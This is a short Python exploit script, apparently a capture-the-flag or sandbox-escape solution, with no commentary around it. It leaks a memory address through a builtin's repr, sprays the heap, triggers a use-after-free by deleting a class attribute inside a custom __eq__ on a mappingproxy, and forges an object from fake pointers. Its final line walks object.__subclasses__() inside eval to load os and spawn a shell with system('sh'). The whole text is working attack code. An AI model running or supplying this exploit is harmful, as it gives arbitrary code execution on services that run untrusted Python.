leak = int(next(iter(next(iter(reversed("{0.__new__}".format(str).split(" ")))).split(">"))), 16)
o1 = 0xc6a0 # id(bytearray) - leak
o2 = 0xd648 # id(-5) - leak
d = b"D"*100024 +  (leak + o1).to_bytes(8, 'little')+(0x28).to_bytes(8, 'little')+(8).to_bytes(8, 'little')+((leak + o2)-0x30).to_bytes(8, 'little')*2+(0).to_bytes(8, 'little')
g = []
for i in range(100): g.append(b"Z"*100000)
global b2
b1 = b"A"*100000
b2 = b"B"*100000
b3 = b"C"*100000
class A:
    a = b2
A.a
class pwn:
    def __eq__(self, o):
        del o['a']
vars(A) == pwn()
del b1
del b2
del b3
c = bytes(iter(d))
A.a.reverse()
eval("[c for c in object.__subclasses__() if '_frozen_importlib.BuiltinImporter' in str(c)][0].load_module('os').system('sh')")
